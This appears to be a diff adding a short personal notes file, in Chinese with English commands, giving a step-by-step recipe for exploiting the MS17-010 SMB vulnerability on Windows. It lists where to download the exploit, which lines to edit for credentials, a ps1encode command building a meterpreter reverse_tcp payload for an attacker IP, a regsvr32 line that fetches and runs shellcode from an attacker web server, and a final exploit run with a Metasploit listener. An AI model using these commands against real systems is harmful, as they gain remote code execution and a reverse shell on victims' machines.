@@ -1,0 +1,19 @@
+
+最重要是用户名要可以用，
+1.download exploit:
+https://www.exploit-db.com/exploits/42315/
+https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
+touch __init__.py
+
+2.打开exploit.py并跳到第26和27行进行修改
+修改username与password
+
+3.https://github.com/CroweCybersecurity/ps1encode
+ruby ps1encode.rb --PAYLOAD windows/meterpreter/reverse_tcp --LHOST=<ATTACKER_IP> -- LPORT=4444 -t sct
+sct文件必须放在web目录下,chmod +x xxx.sct
+
+4.修改service_exec,
+regsvr32 /s /n /u /i:http://<attacker_webserver_ip>/shellcode.sct scrobj.dll
+
+5.msf 监听
+4.python exploit.py ip spoolss
